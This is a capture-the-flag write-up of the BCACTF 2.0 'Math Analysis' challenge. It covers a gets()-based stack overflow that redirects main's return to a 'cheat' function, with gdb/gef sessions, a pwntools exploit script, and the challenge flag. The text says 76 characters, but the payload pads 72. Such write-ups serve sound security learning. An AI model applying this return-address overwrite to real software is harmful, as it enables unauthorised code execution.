# Math Analysis

#### Category : binex
#### Points : 150 points (147 solves)
#### Author : Edward Feng

## Challenge
Congratulations, you've graduated from letters! Now, let's move on to numbers.

From the BCA Course Catalog:

> Analysis I includes linear and quadratic functions, polynomials, inequalities, functions, exponential and logarithmic functions, conic sections, and geometry.

That's a lot of cool stuff! I think you'll have tons of fun learning about functions in this class!

-   [analysis.c](https://objects.bcactf.com/bcactf2/analysis/analysis.c)
-   [analysis](https://objects.bcactf.com/bcactf2/analysis/analysis)
-   `nc bin.bcactf.com 49158`

## Solution
Looking at `analysis.c`, we see that there are 2 functions `main` and `cheat`. `cheat` is where our flag is at.

So we need to overflow the return address of the `main` function with the address of `cheat` function.

#### Overflowing the return address
We set a breakpoint just after the gets function and then try to overflow.
```bash
gef➤  b *0x0000000000401378
Breakpoint 2 at 0x401378
gef➤  info frame
Stack level 0, frame at 0x7fffffffe720:
 rip = 0x4012da in main; saved rip = 0x7ffff7e0dd0a
 Arglist at 0x7fffffffe710, args:
 Locals at 0x7fffffffe710, Previous frame's sp is 0x7fffffffe720
 Saved registers:
  rbp at 0x7fffffffe710, rip at 0x7fffffffe718
```

We notice that just after 76 characters, whatever we write goes into the `saved rip`
```bash
gef➤  run < <(python -c "print('A'*72+'123456')")
Starting program: /home/p1xel/Documents/ctf-writeups/2021/BCACTF 2.0/Math Analysis/analysis < <(python -c "print('A'*72+'123456')")
gef➤  c
Continuing.
It's math time, baby!
WOOO I love my numbers and functions and stuff!!
For example, here's a number: 4198998.
What do you think about that wonderful number?
>
gef➤  info frame
Stack level 0, frame at 0x7fffffffe720:
 rip = 0x401378 in main; saved rip = 0x363534333231
 Arglist at 0x7fffffffe710, args:
 Locals at 0x7fffffffe710, Previous frame's sp is 0x7fffffffe720
 Saved registers:
  rbp at 0x7fffffffe710, rip at 0x7fffffffe718
```

Carefully notice that we have successfully overflowed the value of `saved rip` to `0x363534333231` which is reverse of hex value of `123456`(due to endianness).

#### Finding the return address of cheat function
Now we have the power to overflow the return address with anything we want. As in this challenge we have to get the flag, we need to overflow the return address with the memory address of the `cheat` function.

To find this we do `disass cheat` in gdb/gef
```bash
gef➤  disass cheat
Dump of assembler code for function cheat:
   0x0000000000401256 <+0>:	endbr64
```
`cheat<+0>` is the memory address of the `cheat` function.

So we need the overflow the return address to `\x56\x12\x40\x00\x00\x00` (due to endianness)

#### Getting flag
With all that information, we can make our [get_flag.py](https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BCACTF%202.0/Math%20Analysis/get_flag.py) script
```python
#!/usr/bin/python3
from pwn import *
host = "bin.bcactf.com"
port = 49158
p = remote(host, port)
(p.recvuntil(b"wonderful number?"))
payload = "A"*72+'\x56\x12\x40\x00\x00\x00'
p.sendline(payload)
print(p.recvuntil("bcactf{")[-7:]+p.recvuntil("}"))
```
```bash
$ python3 get_flag.py
[+] Opening connection to bin.bcactf.com on port 49158: Done
b'bcactf{challenges_are_just_functions_mapping_from_coffee_to_points}'
[*] Closed connection to bin.bcactf.com port 49158
```

flag : `bcactf{challenges_are_just_functions_mapping_from_coffee_to_points}`